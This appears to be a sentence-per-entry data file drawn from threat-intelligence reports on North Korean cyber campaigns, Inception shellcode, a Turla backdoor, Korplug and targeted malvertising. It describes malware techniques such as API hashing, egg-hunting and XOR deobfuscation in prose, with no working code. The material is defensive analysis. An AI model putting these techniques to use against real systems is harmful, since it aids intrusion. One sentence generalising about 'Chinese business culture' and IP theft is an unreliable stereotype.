networks .", "4265": "The next significant cyber attack attributed to North Korea was in June 2006 .", "4266": "The U.S. State Department was attacked by entities in the East Asia-Pacific region .", "4267": "The attacks coincided with State Department negotiations with North Korea regarding the regime 's nuclear missile tests .", "4268": "In July 2006 , North Korea 's Unit 121 reportedly breached South Korean and U.S. military entities .", "4269": "This attack was concurrent with the regime 's test-fire of at least one long-range missile and several medium-range missiles .", "4270": "2007 was politically tumultuous for North Korea .", "4271": "Following multi-national talks , the UN's International Atomic Energy Agency ( IAEA ) ordered the shutdown of the regime 's nuclear facilities in Yongbyon in July .", "4272": "Its nuclear efforts temporarily thwarted , North Korea tested a logic bomb in October 2007 .", "4273": "In April 2009 , North Korea ejected IAEA and U.S. nuclear compliance officials .", "4274": "The regime indicated refusal to comply with any UN agreements regarding nuclear weaponry and announced it would reinstate its nuclear materials production .", "4275": "The next month , North Korea conducted an underground nuclear test and voiced its confidence that the regime was well on its way to producing viable nuclear technology .", "4276": "The UN called an emergency meeting condemning the nuclear weapons test , and South Korea joined the Proliferation Security Initiative ( PSI ) .", "4277": "North Korea issued a statement via KCNA calling South Korea 's involvement in PSI an act of war .", "4278": "In June 2009 , North Korea stated that it was '' fully ready for any form of high-tech war .", "4279": "'' The following month , DDoS and disk wiping malware , later known as DarkSeoul , targeted South Korean and U.S. government entities , media outlets , and financial websites .", "4280": "The attacks coincided with U.S .", "4281": "Independence Day .", "4282": "Other malware used for Operation Troy was also planted .", "4283": "Operation Troy would continue for several years , largely undetected .", "4284": "In early 2011 , political and military tensions were high .", "4285": "In February , James Clapper , United States Director of National Intelligence , testified that North Korea likely had undeclared uranium enrichment facilities as part of its nuclear weapons program .", "4286": "In March 2011 , South Korean media , financial , and critical infrastructure targets suffered a DDoS and disk-wiping malware attack later known as the '' 10 Days of Rain '' .", "4287": "U.S. and South Korean military entities were also targeted by DDoS during this attack .", "4288": "The attack used the DarkSeoul malware .", "4289": "North Korea also disrupted South Korean GPS signals .", "4290": "Additionally , North Korean actors reportedly attempted a DDoS attack against South Korea 's Incheon Airport that same month .", "4291": "These incidents coincided with the annual U.S. \u2013 South Korea joint military exercises .", "4292": "The following month , North Korean actors reportedly launched a DDoS attack against South Korea 's Nonghyup bank .", "4293": "In 2012 , an attack on South Korean Newspaper JoongAng Ilbo was attributed to North Korean actors .", "4294": "This attack also coincided with the timing of the annual joint U.S. \u2013 South Korea military exercises .", "4295": "In September 2012 , North Korea signed a cyber treaty with Iran , agreeing the two nations would collaborate to combat '' common enemies '' in cyberspace .", "4296": "The week of March 11 , 2013 , the U.S. and South Korea began their annual joint military exercise near the Korean Peninsula .", "4297": "Like clockwork , attacks attributed to North Korea and now known as the March 20 attacks targeted three South Korean media outlets and Shinhan , Nonghyup , and Jeju banks .", "4298": "North Korea also exhibited other hostile activity at that time .", "4299": "North Korea cut communication with Seoul and announced it had scrapped the 1953 armistice between the two Koreas .", "4300": "North Korea 's foreign ministry also issued a statement that it perceived this exercise as a precursor to invasion and that the regime would respond with a '' strong military counteraction '' if the situation escalated .", "4301": "That same week , the North Korean military conducted a drone attack simulation .", "4302": "On March 18 , the Uriminzokkiri YouTube channel posted an anti-U.S. video entitled '' Firestorms Will Rain on the Headquarters of War '' that showed a depiction of the White House in crosshairs , followed by an explosion .", "4303": "The latter took place on June 25 , the anniversary of the start of the Korean War .", "4304": "As evidenced above , much of North Korea 's cyber activity coincides with the annual U.S. \u2013 South Korea joint military exercises .", "4305": "Attacks not following that pattern were typically in response to political events impacting the regime or correlated with significant dates , such as the anniversary of the start of the Korean War .", "4306": "The regime 's strategic assets and tactical capabilities in the cyber arena seem to have evolved only slightly since 2009 .", "4307": "Most of the attacks attributed to North Korea employ limited tactics , and their operational capability demonstrates an increase in the frequency and volume of attacks but is otherwise unimpressive to date .", "4308": "In June 2014 , the regime demanded cancellation of the annual U.S. - South Korea joint military exercise , attempting to use participation in the upcoming Asian Games as a bargaining chip .", "4309": "The regime 's demands may have had other political motivations , as they preceded the July 2014 meeting between South Korean president Park and Chinese President Xi Jinping .", "4310": "The meeting centered on trade and regional security issues , including the ever-present rhetoric around denuclearization of North Korea .", "4311": "Both leaders were critical of Japan 's recent announcement to soften sanctions on North Korea .", "4312": "As this report headed to press , the annual U.S. \u2013 South Korea joint military exercises were underway .", "4313": "The most prominent North Korean threat actor group is the group responsible for the DarkSeoul malware .", "4314": "According to statements from the South Korean government , North Korea 's Lab 110 were the actors behind the DarkSeoul malware .", "4315": "South Korean intelligence reports stated that Lab 110 , which is affiliated with the regime 's defense ministry , was ordered by the North Korean regime to destroy South Korean communications networks .", "4316": "Although the March 20 attacks used DarkSeoul malware , it is interesting to note that two groups , WhoIs Team and New Romantic Cyber Army Team , claimed responsibility for the '' March 20 '' 2013 attacks on South Korean media and financial institutions .", "4317": "Some of the DarkSeoul attacks corresponded with significant dates , such as U.S .", "4318": "Independence Day or the anniversary of the start of the Korean War .", "4319": "DarkSeoul attacks go beyond denial of service and sabotage .", "4320": "As early as 2009 , the group responsible for the Dark Seoul attacks launched '' Operation Troy '' , an espionage campaign targeting the South Korean military .", "4321": "The operation was codenamed '' Troy '' due to the frequent use of the word '' Troy '' in the malware's compile path strings .", "4322": "The March 2011 '' 10 Days of Rain '' DDoS attacks on U.S. and South Korean sites have also been attributed to the actors associated with DarkSeoul .", "4323": "According to Symantec , the politically motivated attacks have required a level of intelligence , coordination , monetary support , and technical sophistication that suggests state sponsorship .", "4324": "This designation means the group can be considered an advanced persistent threat ( APT ) .", "4325": "A March 20 , 2013 attack attributed to the DarkSeoul actors targeted three South Korean media outlets and Shinhan , Nonghyup , and Jeju banks .", "4326": "However , the targeted entities resumed normal operations shortly thereafter .", "4327": "According to South Korean reports , the media outlets targeted corresponded with those listed by the North Korean regime in 2012 as right-wing press that manipulated South Korea 's public opinion .", "4328": "In April 2012 , the regime reportedly listed those entities as attack targets .", "4329": "McAfee found that these attacks were the culmination of the malware campaign they dubbed '' Operation Troy '' .", "4330": "A report from IssueMakersLab tied the actors responsible for the March 20 , 2013 attacks to cyber attack activity occurring as early as 2007 .", "4331": "Details of the March 20 attack also suggested possible ties to China .", "4332": "Additionally , researchers at AhnLab in South Korea noted a Chinese IP address linked to the attacks .", "4333": "While no concrete evidence has been released that indicates Lab 110 was responsible for the DarkSeoul attacks , the responsible group 's targets , TTP , and attack timing demonstrate a strong pro-North Korean sentiment .", "4334": "Known tactics , techniques and procedures Targets WhoIs Team is one of two groups that claimed responsibility for the '' March 20 '' attacks targeting South Korea .", "4335": "A defacement on the LG +U webpage stated that it was '' Hacked by WhoIs Team '' and that the attackers would return .", "4336": "The page featured three skulls .", "4337": "However , no other attacks by WhoIs Team have been observed .", "4338": "Known tactics , techniques , and procedures Targets Associated actors Based on North Korea 's affinity for disinformation and counterintelligence , we must note the distinct possibility that operatives claiming to be WhoIs Team are part of another group and that the defacement was a false flag operation meant to pin blame on RAONASRT .", "4339": "RAONASRT is a South Korean white hat capture the flag ( CTF ) team , whose members also operate under the name '' WhoIs '' .", "4340": "l RAONASRT ( the RaonSecure Advanced Security Research Team ) and its sub-teams WhoIs Team and Cpark Team have participated in and performed well in CTF contests such as the one hosted by DefCon .", "4341": "In 2013 , a member of RAONASRT was invited to Blue House , the residence of the South Korean president , to meet with president Park and discuss the security industry .", "4342": "RAONASRT runs the Secuinside CTF competition .", "4343": "Their parent organization RaonSecure operates a whitehat training program .", "4344": "The group also runs the Korea WhiteHat Contest , which is hosted by South Korea 's Ministry of National Defense and National Intelligence Service and supervised by South Korean Cyber Command .", "4345": "For these reasons , it seems unlikely that the RAONASRT WhoIs Team would maliciously target South Korean entities .", "4346": "IsOne is the group that claimed responsibility for the June 2012 attack on the website of South Korean newspaper JoongAng Ilbo .", "4347": "The attack included an attempt to wipe JoongAng Ilbo 's servers as well as a defacement depicting a laughing cat .", "4348": "Despite efforts to wipe the target 's servers , the target only suffered defacement and temporary downtime .", "4349": "Although the groups have a similar name and both use a cat theme , it is unclear whether a CTF team known as '' The Cat is Number 1 '' and IsOne are the same actors .", "4350": "'' The Cat is Number 1 '' members claim to hail from North Korea , but there is no hard evidence linking team members to the region .", "4351": "Again , it seems that the actors responsible for the attack borrowed the moniker of another group .", "4352": "According to South Korea 's National Police Agency , the attack on JoongAng Ilbo shares characteristics with previous attacks attributed to North Korean actors .", "4353": "An investigation conducted by the agency 's Cyber Terror Response Center found that the actors targeting JoongAng Ilbo used two North Korean servers and 17 servers in 10 other countries .", "4354": "One server maintained a constant connection to an IP address belonging to Joson Telecommunication Company , which is affiliated with North Korea 's Ministry of Posts and Telecommunications .", "4355": "Investigators found that one of the servers used in the attack on JoongAng Ilbo was also used in the March 2011 DDoS attacks on South Korean critical infrastructure sites and the April 2011 attack on Nyongyup Bank .", "4356": "Known tactics , techniques and procedures Targets The Kimsuky malware , which targeted South Korean think tanks , is loosely attributed to an actor referred to as Kimsukyang .", "4357": "Little is known about the actor or group responsible for the malware .", "4358": "However , the following email addresses are associated with the Kimsuky operation : The email address iop110112 @ hotmail.com was registered using the alias '' kimsukyang '' , and rsh1213 @ hotmail.com was registered using the alias '' Kim asdfa '' .", "4359": "Kaspersky found that the Kimsuky operation used 10 IP addresses in two Chinese provinces that border North Korea : Jilin and Liaoning .", "4360": "Known tactics , techniques and procedures Targets The New Romantic Cyber Army Team also took credit for the March 20 , 2013 attacks .", "4361": "McAfee suspected New Romantic Cyber Army Team were responsible for Operation Troy and the resulting March 20 , 2013 attacks due to the group 's '' frequent use of Roman and classical terms in their code .", "4362": "'' It is unknown whether Hastati is an alternate name for the group or whether Hastati is an individual actor within the group .", "4363": "It is interesting to note that the malware associated with these actors uses the strings '' HASTATI '' and '' PRINCIPES '' to overwrite the MBR .", "4364": "The name Hastati likely refers to a class of infantrymen of the early Roman Republic .", "4365": "The Hastati were less experienced soldiers who fought on the frontlines with spears and swords .", "4366": "Principes likely refers to more experienced Roman soldiers who fought on the second line of battle .", "4367": "Known tactics , techniques and procedures Targets HP researchers had previously analyzed samples of the DarkSeoul dropper , and findings were published in our annual HP Cyber Risk Report 2013 .", "4368": "Analysis of this malware is included in Appendix C. Analysis of additional malware used in these campaigns produced no new findings and only corroborated what was found by external security researchers .", "4369": "These publicly available analyses have been cited throughout the report .", "4370": "Some of the malware samples were no longer publicly available .", "4371": "However , CrowdStrike obtained these missing samples before they disappeared from the wild and conducted thorough analysis , which was released in their subscription-only reports .", "4372": "While we can not divulge detailed information from those reports , an overview of the findings is provided below .", "4373": "The majority of the malware used in cyber incidents attributed to North Korea were variations of three types of malware : dropper , wiper , and IRC remote access trojan ( RAT ) .", "4374": "CrowdStrike's attribution of this malware to North Korean actors stemmed from two primary factors : Korean language characters found in the binaries and the propensity to specifically target South Korean entities .", "4375": "Dropper samples consistently targeted AhnLab Policy Center as a propagation method .", "4376": "This information is corroborated in a Black Hat Asia 2014 presentation by Fortinet researcher Kyle Yang .", "4377": "CrowdStrike 's report also briefly noted the use of an update server vector .", "4378": "Yang analyzed the malware 's update config metadata and matched its format to the AhnLab Policy Center .", "4379": "To test its payload , Yang set up a server/client and executed the update through the server .", "4380": "As Yang had predicted , it wiped the client .", "4381": "While there are several variants of the wiper , all seem to have been used on the same date .", "4382": "It is unclear why multiple wiper variants with slightly differing behavior were used for the same campaign .", "4383": "One possible explanation is that multiple variants were used to minimize the operational damage to the mission in the case of an early detection of one of the variants .", "4384": "For example , if one wiper variant was compromised or detected by antivirus or IDS signatures , the other variants may have differed enough to remain undetected , still resulting in mission success .", "4385": "Prioxer has been linked to other 2011 attacks on South Korea .", "4386": "It is unclear whether these downloaders were pushed out in the same update server vector as the wipers .", "4387": "However , the two malware types both use the same packer 'Jokra ' and both contain the strings '' HASTATI '' and '' PRINCPES '' .", "4388": "Based on the information above , we have identified strategic challenges that impact the development of North Korea 's cyber warfare capabilities .", "4389": "We have also noted relevant implications : \u2022 The North Korean regime strictly controls all Internet infrastructure , meaning cyber activity by dissidents or autonomous hacker groups are very unlikely .", "4390": "In other words , any cyber attacks originating in North Korea can be assumed to be state sponsored .", "4391": "For this reason , according to defectors , the regime 's cyber operators do not typically launch attacks directly from within North Korea .", "4392": "Instead , many regime-sponsored attacks are launched from cells based in China , U.S. , South Asia , Europe , and even South Korea .", "4393": "\u2022 North Korea has a limited number of outgoing connections .", "4394": "For this reason , there is a low probability of DDoS originating from within .", "4395": "However , this does not preclude the use of botnets with a local C2 server or the use of networks in third-party nations to launch attacks .", "4396": "As seen in the July 2009 attacks on South Korean and U.S. targets , North Korea has leveraged networks in countries such as Austria , Georgia , Germany , and even South Korea and the U.S. , in order to launch cyber attacks .", "4397": "North Korea will likely be forced to rely on third parties for quite some time , due to its lack of sufficient infrastructure for launching large-scale CNO .", "4398": "\u2022 Several outward facing websites are hosted in China and other countries .", "4399": "This implies two possibilities : that North Korea 's infrastructure can not handle a heavy incoming traffic load or that the regime wants to separate the propaganda crafted for an outside target audience from internally-focused propaganda .", "4400": "This arrangement seems unlikely to change in the foreseeable future .", "4401": "\u2022 North Korea is known to have unstable power supplies , which limits scalability of the regime 's current CNO capabilities .", "4402": "This is another reason why expansion of CNO capabilities using the nation 's own infrastructure seems unlikely in the foreseeable future .", "4403": "\u2022 North Korea is known to have monetary deficiencies , which further limit expansion of infrastructure and CNO capabilities , at least without third-party aid .", "4404": "North Korea continues to rely heavily on China for sustainment .", "4405": "\u2022 Although we see few instances of overt cyber operations , that North Korea reportedly spends so much of its limited resources on training and equipping cyber operators speaks volumes .", "4406": "The human element of the regime 's cyber war program , at least , has potential .", "4407": "\u2022 Sanctions against North Korea and export laws prohibit the sale of certain technologies to the regime .", "4408": "In other words , in order to obtain the technology needed for a cyber warfare program , the regime must improvise .", "4409": "North Korea must develop its own technology , manufacture technology using plans obtained via industrial espionage , or rely on third parties to procure it for them .", "4410": "However , the regime has historically failed in its attempts of large-scale production of electronic components .", "4411": "At present , North Korea relies on China to provide much of its network hardware , including servers and routers .", "4412": "It is unlikely that North Korea will compromise on its nuclear program , meaning sanctions will likely be longstanding , and the regime will have to continue to rely on third parties to procure technology .", "4413": "Cyber incidents attributed to North Korean actors seem to follow distinct patterns : \uf0b7 According to reports by other researchers , the conventions and C2 structure used by North Korean cyber actors show continuity and consistency over time .", "4414": "\uf0b7 The majority of the incidents attributed to North Korean actors consistently used wiper malware .", "4415": "\uf0b7 Several of the incidents included defacements , with a different group taking credit each time .", "4416": "Additionally , little information or attack history was found about any of the groups , aside from information acknowledged in this report .", "4417": "These factors seem to indicate that a single group may have been responsible for several attacks over time , using different group names as a false flag .", "4418": "\uf0b7 On more than one occasion , the malware included provisions to disable security software made by South Korean security company AhnLab .", "4419": "This detail strengthens the case that the malware was written or modified to specifically target South Korean machines .", "4420": "\uf0b7 The attacks followed an explicit pattern : most were around the time of U.S. \u2013 South Korean joint military exercises , while the others fell on a significant date or were in response to political events .", "4421": "\uf0b7 The primary targets were South Korean and U.S. entities .", "4422": "While these nations are traditionally targeted by the regime , it is also possible that South Korean entities are quick to attribute any attack on their infrastructure to North Korean actors .", "4423": "In fact , in some cases , South Korean reports were the only source of attribution .", "4424": "Does North Korea have sufficient cyber infrastructure and cyber warfare capabilities to harm the U.S. and its allies ? While North Korea 's cyber warfare capabilities pale in comparison to those of wealthier nations , the regime has made significant progress in developing its infrastructure and in establishing cyber operations .", "4425": "The rate of this progress warrants a closer look at North Korea's motivations , TTPs , and capabilities .", "4426": "As noted above , North Korea views the U.S. and South Korea as its primary adversaries .", "4427": "The U.S. and South Korea are high-tech nations with economies that depend heavily on technology .", "4428": "In contrast , North Korea does not have a high tech culture .", "4429": "For these reasons , we should not overestimate the regime 's advanced cyber capability , yet we should never underestimate the potential impact of North Korea utilizing less advanced , quick-and-dirty tactics like DDoS to cripple their high-tech targets .", "4430": "Both government and corporate entities are susceptible to being targeted by North Korean cyber attacks .", "4431": "North Korean juche ideology places the survival of the regime as its primary goal , and any perceived threat to the regime may be targeted .", "4432": "Several attacks on U.S. and South Korean government , financial , and critical infrastructure entities have been attributed to North Korean origins.. These attacks were often preceded by or occurred in conjunction with North Korea voicing negative sentiments about the targeted entities .", "4433": "As we saw with Iranian cyber actors in HPSR Security Briefing Episode 11 , state sponsored cyber actors often launch an attack in response to a political trigger .", "4434": "The same pattern seems to apply to pro-North Korean cyber actors , who have launched attacks to coincide with U.S .", "4435": "Independence Day and the anniversary of the start of the Korean War , as well as propaganda and cyber attacks in response to joint military exercises between the U.S. and South Korea .", "4436": "As shown by North Korea 's past behavior ( which is consistent with their doctrine ) , they are easily '' pushed into a corner '' .", "4437": "At the slightest perceived threat , the regime responds with saber-rattling and peacocking .", "4438": "The regime is extremely defensive and will , in turn , flex its muscles to show the world how capable it is , even if this is an inaccurate display of their overall capabilities .", "4439": "The regime fears losing its control and the nation 's culture to the ever-growing threat of outside influence , as is evidenced in the regime 's reaction to the comedy film '' The Interview '' .", "4440": "The regime has represented itself to its citizens as a powerful and capable entity and has used this status to control the populace .", "4441": "For this reason , the regime 's leaders are forced to continually demonstrate this strength and power , or an illusion thereof , both domestically and globally , in order to maintain the status needed to ensure continued suppression of the population .", "4442": "This show of power may require that the regime takes chances and stretches beyond its abilities at times , but in the spirit of juche and songun , the regime will continue this fa\u00e7ade , fearful of losing the image its leaders have worked so hard to maintain .", "4443": "North Korean cyber operations are not generally observed originating from home field IP address space , so geo-IP based blocking of traffic originating from those net-blocks is ineffective .", "4444": "Given that North Korea has capable and technically trained forces and will demonstrate their power when they feel provoked , western entities should consciously avoid promoting ideas or doctrine that is blatantly slanderous to the regime .", "4445": "Encouraging such ideas could cause those entities to become a focal point for North Korean cyber attacks .", "4446": "Due to the fact that North Korean infrastructure is aging and its resources are not able to keep up with the rest of the world , entities with interesting R & D or IP ( intellectual property ) - especially military in nature \u2013 could become targets of interest for North Korea .", "4447": "Interest in defense-related IP and R & D could also stem from North Korea 's relationship with China .", "4448": "In the Chinese business culture , taking another entity 's IP or R & D is not stealing \u2013 it is accepted as business as usual .", "4449": "It is possible that North Korea , if under Chinese influence , would adopt the same attitude , given the regime 's limited capacity for homegrown innovation .", "4450": "Known DPRK targets have been limited primarily to South Korean and U.S. organizations and government entities .", "4451": "For these targets , prudent measures should include : The dropper component that we examined was distributed as a UPX-packed binary .", "4452": "\u2022 mRemote-an open source tool for centrally managing remote server connections using a GUI ( Kevin Kline , 2008 ) .", "4453": "This tool is no longer being actively developed or supported .", "4454": "\u2022 SecureCRT-a commercial SSH and Telnet client by VanDyke Software .", "4455": "The password is decrypted after being extracted .", "4456": "If these conditions are satisfied , the username , hostname , port , and password are extracted .", "4457": "The password is then decrypted .", "4458": "After reading the Inception paper by Snorre Fagerland and Waylon Grange , I got curious about this threat and did some reversing .", "4459": "I felt that it would be good to write a technical blog about the process - maybe it could be helpful or interesting for some .", "4460": "RTF file Analysis MD5 : 4a4874fa5217a8523bf4d1954efb26ef Exploit : CVE-2012 - 0158 As we can see in following screen shot , this is a RTF [ Rich Text Format ] file .", "4461": "Its common that attackers use document files such as these as bait .", "4462": "It is common that shellcode starts with a NOPsled .", "4463": "In following screenshot we can see that the embedded shellcode starts with NOP slide .", "4464": "NOP , or No OPeration - is a single - byte opcode that does nothing .", "4465": "It has the hex value of 0x90 .", "4466": "Now , to the functionality of the shellcode .", "4467": "We will ignore the first two prolog instructions , and for remaining statements I have inserted comments to help understanding what is happening in this chunk of code .", "4468": "It 's traversing the TEB , the PEB and the Ldr structure to get the base addresses of ntdll.dll and kernel32.dll .", "4469": "It needs these to find the API addresses it requires for the rest of the infection .", "4470": "In screenshot below , Function 00120F82 is the malware 's own GetProcAddress function which takes two parameters The function returns the memory address of the API .", "4471": "As shown in the next screenshot , this function parses the \" export name pointer table \" of the .dll [ ex .", "4472": "kernel32.dll ] and generates a hash for each function .", "4473": "It compares this with the argument API hash ( Ex DF7D9BAD for GetFileSize , see above screenshot ) using the CMP EDI , ESI instruction .", "4474": "Once the matching API is found it parses the Export Address Table and returns the respective API address to the caller in EAX register .", "4475": "The document contains two levels of shellcode .", "4476": "We are analyzing first level , and in the following code we can see a typical egghunting method : It attempts to open the already opened rtf file by checking file handles in memory .", "4477": "It starts with a handle with the value 4 and verifies it by doing GetFileSize on it .", "4478": "If this fails it does ADD ESI,4 again ( adds 4 to the handle ) until the API succeeds .", "4479": "When this happens it checks the file offset 0x8300 for the marker 0x54405450 .", "4480": "Again , if this matches up , it allocates memory into which it reads the file content and jumps to the 2nd level shellcode with a JMP EBX .", "4481": "At the initial stage there are few instructions waiting to help us .", "4482": "This is the deobfuscation code .", "4483": "We can see that 0x23B * 4 is the number of bytes obfuscated , POP EBX is the get EIP instruction and 0x5687F945 is the deobfuscation XOR key .", "4484": "In following code we can see the hexadecimal value that corresponds to the library name being pushed to the LoadLibrary function , as well as two loops to get the API addresses using \" CALL 02E203E2 \" function .", "4485": "Here also it uses hashes to look up APIs .", "4486": "In the following code it searches for the embedded VBS file inside the RTF file in memory .", "4487": "It checks for the file size in a loop , and if the size is larger than 0x2000 then it sets the file ponter to 0x8C14 to compare with the VBS file marker as we can see in following screenshot .", "4488": "After finding the VBS marker in memory , it decrypts the VBS file in two iterations .", "4489": "In the first loop it decrypts and in the second loop it swaps the low and high bytes of the first 0x100 16-bit words , after which it writes the file to a file named \" Temp / ew_Rg.vbs \" .", "4490": "The following screenshot shows a part of the .VBS payload file dropped by .RTF file .", "4491": "First line is the encrypted .dll 4th line contains Key to decrypt the .dll .", "4492": "Remaining part is self - explanatory .", "4493": "The instruction c = Crypt(c , k ) function decrypts the encrypted dll and returns the decrypted dll .", "4494": "( See the screenshot above ) c= encrypted dll .", "4495": "k = decryption key .", "4496": "Following function writes byte by byte to the dropped.dll file .", "4497": "Finally , the following code executes the \" regsvr32 \" command to run the wmiprvse.dll in silent mode and sets the run key in registry .", "4498": "This first level of deobfuscation in wmiprvse.dll takes around 3 - 4 minutes to finish .", "4499": "Then it allocates memory using VirtualAlloc and writes the unpacked code to newly allocated memory before it jumps to the unpacked code as shown in following screen shot .", "4500": "This dll has 3 layers of unpacking .", "4501": "The one above is level one , below iyou can see level two .", "4502": "We can see the passing of the control to the newly unpacked .dll @CALL EAX .", "4503": "Analyst can not directly see which API gets called .", "4504": "Reference .", "4505": "https://www.bluecoat.com / security - blog/2014 - 12 - 09/blue - coat - exposes-%E2%80%9C- inception - framework%E2%80%9D - very - sophisticated - layered - malware", "4506": "If failed , tries to write to the file f:\\keyhook.log Each time the keylogger starts , it appends the following header to the log file .", "4507": "Depending on the results , it writes a line to its log file .", "4508": "In case the hook was installed , the line is \" Started ... \" , else \" LoadLibrary ' % path to its file% ' failed , % error code% \" .", "4509": "It also starts a thread that retrieves the current foreground window handle every 100 milliseconds .", "4510": "This handle is then used in the keyboard hook procedure .", "4511": "Every time a new window becomes active , it retrieves its name and the path to its application and writes this information to the log file .", "4512": "[ % path to the application 's executable file% : \" % window title% \" ] Analyzed file ( others are similar ) .", "4513": "Compilation timestamp : 2013.10.15 10:43:09 ( GMT ) File format : PE32 DLL , modified ( the file is supposed to be started by a custom loader ) Exports .", "4514": "The main functionality is implemented in a single function that is called by the DllMain entry point .", "4515": "The exported functions allow to call the same function directly ( exported as \" start \" ) or to start / stop it in a separate thread ( \" ModuleStart\"/\"ModuleStop \" ) and with slightly different parameters .", "4516": "This indicates the backdoor can also function as a plugin for the Turla Carbon system .", "4517": "The main function executes in an infinite loop .", "4518": "The module delays execution for random periods while it discovers running processes with one of the following filenames .", "4519": "The following system information is collected .", "4520": "The C&C communication is implemented on top of the standard HTTP / HTTPS protocols .", "4521": "The list of the C&C URLs is hardcoded in the binary but may be overridden by further commands .", "4522": "The request body can be empty if there is no new information to upload .", "4523": "The response is usually an HTML document and the commands are Base64-encoded strings enclosed in < div>/</div > tags .", "4524": "Every command is encrypted using asymmetric encryption with temporary AES session keys .", "4525": "Each command is a mixed text / binary buffer .", "4526": "It consists of two parts : payload and configuration .", "4527": "It is extracted into a temporary file named % TEMP%\\~D%random%.tmp .", "4528": "The payload , if exists , is supposed to be an executable file and may be executed if there is a corresponding command present in the INI part .", "4529": "The format of the decoded command is the following .", "4530": "Format of the C&C command buffer Available commands are .", "4531": "Lateral movement tools .", "4532": "Epic / Tavdig backdoors .", "4533": "Dropper packages that installs both Epic and Turla Carbon system .", "4534": "PDF exploits used in spearphishing attacks drops Epic backdoor .", "4535": "SCR / EXE files - used in spearphishing / social engineering .", "4536": "Fake \" Adobe Flash Player \" Epic backdoor installers .", "4537": "Fake \" Microsoft Security Essentials Quick Scan \" Epic backdoor installer Turla Carbon Pfinet backdoors Turla Carbon package Related Turla sample module Java Exploits used in waterhole attacks", "4538": "This blog gives an overview of the first one , related to Afghanistan & Tajikistan .", "4539": "The other campaign , where the targets were a number of high-profile organizations in Russia , will be the subject of Anton Cherepanov 's presentation at the ZeroNights security conference in Moscow this week .", "4540": "Sometimes malware used in various attacks is unique enough to identify related incidents , which makes tracking individual botnets simpler .", "4541": "An example is the BlackEnergy Lite variant ( also known as BlackEnergy 3 ) used by a group of attackers ( that was then given the name Quedagh , or Sandworm ) against targets in Ukraine and other countries .", "4542": "BlackEnergy Lite is clearly distinguishable from the numerous binaries of the more common BlackEnergy 2 also circulating in-the-wild .", "4543": "In other cases , attackers use more common tools for accomplishing their criminal goals .", "4544": "For the past several weeks we have taken a closer look at a great number of detections of this malware in many unrelated incidents .", "4545": "A table with a selection of RTF documents and RAR self-extracting archives with a .SCR", "4546": "The image below shows the beginning of the CVE-2012-0158 shellcode in ASCII encoding within the document ( the opcodes 60 , 55 , 8bec disassemble to pusha ; push ebp ; mov ebp , esp ) .", "4547": "Interestingly , though , the documents also contain the newer CVE-2014-1761 exploit that was extensively used in targeted attacks carried out by a number other malware families this year ( including BlackEnergy , Sednit , MiniDuke , and others ) .", "4548": "However , this exploit is not implemented correctly due to a wrong file offset in the 1st stage shellcode .", "4549": "Below we see the disassembly of the 1st stage shellcode where it checks the presence of the tag '' p ! 11 '' marking the beginning of the 2nd stage shellcode and loads it into memory .", "4550": "Even though the tag and 2nd stage shellcode is present in the RTF , it 's at a different offset , and thus never is loaded .", "4551": "Sophos ' Gabor Szappanos gives a possible explanation how these malformed samples may have come into existence .", "4552": "ESET LiveGrid telemetry indicates that the attacks against these targets have been going on since at least June 2014 and continue through today .", "4553": "We were able to pinpoint the targets to residents of the following countries : From the topics of the files used to spread the malware , as well as from the affected targets , it appears that the attackers are interested in gathering intelligence related to Afghan , Tajik and Russian military and diplomatic subjects .", "4554": "Interestingly , most of the affected victims have another thing in common \u2013 a number of other RATs , file stealing trojans or keyloggers were detected on their systems on top of the Korplug RAT detection .", "4555": "Since the functionality of these tools was partly overlapping with that of Korplug , it left us wondering whether the attackers were just experimenting with different RATs or were they supplementing some functionality that they were unable to accomplish .", "4556": "Additional information about two malware families that were most often found accompanying Korplug infections is given below .", "4557": "Some samples contain a digital signature by '' Nanning weiwu Technology co. , ltd '' .", "4558": "Within the last six months , Invincea has discovered and stopped targeted malvertizing attacks against specific companies -- particularly those in the Defense Industrial Base .", "4559": "The combination of traditional cyber crime methods ( malvertising ) with targeted attacks against Defense industrials for theft of IP represents another development in the on-going blending of techniques from cyber crime and advanced threat actors with nation state agendas .", "4560": "We are tracking an on-going campaign against US Defense companies under the code name Operation DeathClick .", "4561": "In this new targeted variation of malvertizing , the perpetrators are attacking specific organizations by leveraging real- time ad bidding networks and micro-targeting techniques developed over the last decade in online advertising .", "4562": "The objective of these micro-targeted attacks against the Defense sector is likely theft of Intellectual Property more than ad fraud and indicates motive and sophistication characteristic of advanced threat actors .", "4563": "While we discovered these attacks across multiple Defense companies , we expect it will not be long , if not already , before other highly targeted segments including Federal , Financial Services , Manufacturing , and HealthCare are victimized with the same micro-targeted malvertising .", "4564": "The campaign described here does not represent a single flaw , 0-day , or unpatched bug , but rather a significant development in the adversary 's capabilities and strategy to leverage legitimate online advertising platforms on well-known ad supported websites via a technique called Real-Time Ad Bidding .", "4565": "In other words , this problem will not be patched on Tuesday .", "4566": "UPDATE : We have updated this document to include a new section on a campaign of distributing CryptoWall ransomware via malvertising .", "4567": "While the attack vector is the same , we believe this to be motivated by cybercrime rather than theft of IP from Defense companies .", "4568": "Malvertising has seen meteoric rise in 2014 .", "4569": "These exploit kits are hosted on compromised web servers across the world .", "4570": "In other words , they leverage legitimate ad-supported popular websites together with compromised websites for hosting exploit landing pages , defeating black-listing techniques .", "4571": "The lifetime of these ads and landing pages are measured in hours .", "4572": "They are employing the tactics of real-time ad bidding to guarantee malicious ad delivery to intended targets of the campaign \u2013 building on a decade of work in real-time analytics for online ad placement , but for nefarious purposes .", "4573": "The threat actors redirect their ads for just minutes at a time and then abandon their exploit kit pages forever .", "4574": "This means that list-based threat intelligence feeds are rendered ineffective .", "4575": "The domains used do not appear in any proxy blacklist , and the malware droppers delivered by the exploit pages always employ different signatures , evading traditional network and endpoint detection technology .", "4576": "Ad delivery networks today are not incentivized to address the problem in a credible manner as they derive revenue from the criminal enterprise , while not being held accountable .", "4577": "Turning a blind eye to the problem is rewarded economically .", "4578": "Meanwhile the perpetrators are able to use traditional malvertising and ad fraud bots to fund the criminal enterprise .", "4579": "Without cooperation of ad networks to vet the advertisers working through front companies , this attack vector will go unchecked .", "4580": "For example , oppressive regimes trying to gather intelligence on activist protests can deliver ads to people getting email from within a specific locality where they are protesting .", "4581": "Today , it is commonplace for micro-targeting techniques to be used as part of the toolset in legitimate online advertising .", "4582": "For instance , a defense contractor , trying to win a new omnibus contract , can deliver targeted ads to online news sites frequented by Government program personnel .", "4583": "The latest software product release can be delivered to Windows users visiting PC Magazine 's website .", "4584": "A local car dealership can sense when someone is in the market for a new car and can deliver advertising to those users , based solely on browsing history .", "4585": "Thus , it does n't matter 